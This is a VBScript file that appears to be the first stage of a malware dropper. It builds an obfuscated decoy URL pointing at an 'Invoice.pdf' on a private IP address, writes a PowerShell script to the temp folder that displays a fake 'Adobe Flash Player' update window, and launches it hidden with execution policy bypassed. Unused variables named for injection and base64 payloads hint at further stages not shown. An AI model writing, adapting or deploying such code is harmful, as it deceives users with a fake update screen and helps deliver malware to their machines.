Option Explicit
On Error Resume Next
Dim sh, fso, tmp, hf, psInj, scf, b64, decoy
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tmp = fso.GetSpecialFolder(2)
decoy = "http://172.16" & ".212.142:8000" & "/Invoice.pdf"

' 1) Native "Adobe Flash Player" update window.
Dim psUpd
psUpd = tmp & "\psUpd.ps1"
Set hf = fso.CreateTextFile(psUpd, True)
hf.WriteLine "Add-Type -AssemblyName System.Windows.Forms"
hf.WriteLine "Add-Type -AssemblyName System.Drawing"
hf.WriteLine "$f=New-Object System.Windows.Forms.Form"
hf.WriteLine "$f.Text='Adobe Flash Player'"
hf.WriteLine "$f.ClientSize=New-Object System.Drawing.Size(400,150)"
hf.WriteLine "$f.StartPosition='CenterScreen'"
hf.WriteLine "$f.FormBorderStyle='FixedDialog'"
hf.WriteLine "$f.MaximizeBox=$false;$f.MinimizeBox=$false"
hf.WriteLine "$f.BackColor=[System.Drawing.Color]::FromArgb(43,43,43)"
hf.WriteLine "$t=New-Object System.Windows.Forms.Label"
hf.WriteLine "$t.Text='Updating Adobe Flash Player...'"
hf.WriteLine "$t.ForeColor=[System.Drawing.Color]::White"
hf.WriteLine "$t.Font=New-Object System.Drawing.Font('Segoe UI',11)"
hf.WriteLine "$t.Location=New-Object System.Drawing.Point(20,22);$t.AutoSize=$true"
hf.WriteLine "$f.Controls.Add($t)"
hf.WriteLine "$p=New-Object System.Windows.Forms.ProgressBar"
hf.WriteLine "$p.Location=New-Object System.Drawing.Point(20,60);$p.Size=New-Object System.Drawing.Size(360,22)"
hf.WriteLine "$f.Controls.Add($p)"
hf.WriteLine "$f.Show()"
hf.WriteLine "for($i=0;$i -le 100;$i++){$p.Value=$i;[System.Windows.Forms.Application]::DoEvents();Start-Sleep -Milliseconds 45}"
hf.WriteLine "$f.Close()"
hf.Close
sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psUpd & """", 0, True

